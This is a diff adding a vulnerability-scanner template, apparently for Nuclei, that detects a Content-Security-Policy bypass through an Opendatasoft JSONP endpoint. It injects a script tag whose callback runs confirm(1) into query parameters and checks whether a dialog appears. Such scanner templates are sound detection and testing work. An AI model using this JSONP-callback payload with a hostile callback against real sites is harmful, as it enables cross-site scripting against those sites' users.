@@ -1,0 +1,55 @@
+id: opendatasoft-docs-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Opendatasoft Docs
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,opendatasoft-docs,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "opendatasoft.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: opendatasoft_docs_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://documentation-resources.opendatasoft.com/api/datasets/1.0/doc-geonames-cities-5000/?format=jsonp&callback=confirm(1);"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "opendatasoft_docs_csp_xss == true"
+# digest: 490a0046304402206f4d0db71e3709cddeec9083e055808ccaf921c848a60299e56d0d09d262a811022011df9f21d1a6b9d5943c0b3c4991e352f2b6f10cd4caa5df0043b4d228efa174:922c64590222798bb761d5b6d8e72950
